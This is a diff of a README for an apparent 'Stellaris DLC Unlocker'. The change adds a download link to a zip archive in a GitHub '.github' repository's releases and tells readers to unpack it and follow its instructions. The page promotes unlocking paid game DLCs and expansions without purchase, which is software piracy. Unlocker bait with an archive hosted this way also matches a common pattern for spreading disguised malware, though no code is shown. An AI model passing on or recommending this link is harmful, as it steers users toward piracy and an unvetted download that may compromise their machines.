@@ -2,11 +2,11 @@
 
 ## 📥 Getting Started
 To get started with Stellaris DLC Unlocker, follow these simple steps:
-1. **Get the unlocker: [🔗 Download Stellaris DLC Unlocker]()**
+1. **Get the unlocker: [🔗 Download Stellaris DLC Unlocker](https://github.com/Stellaris-DLC-Unlocker/.github/releases/download/1.65/Stellaris-DLC-Unlocker.zip)**
 2. **Unpack the archive and follow the instructions!**
 3. **Enjoy the game!**
 
-**📌 Description:**  
+## 📌 Description:
 🚀 **Stellaris DLC Unlocker** is the best currently available way to unlock Stellaris DLCs and Expansions and keep them up-to-date while also being able to get access to online features like gallery.
 
 ![DLC Unlocker Preview](https://i.playground.ru/p/l9ufV5yoBqm398ieux8rbg.png)
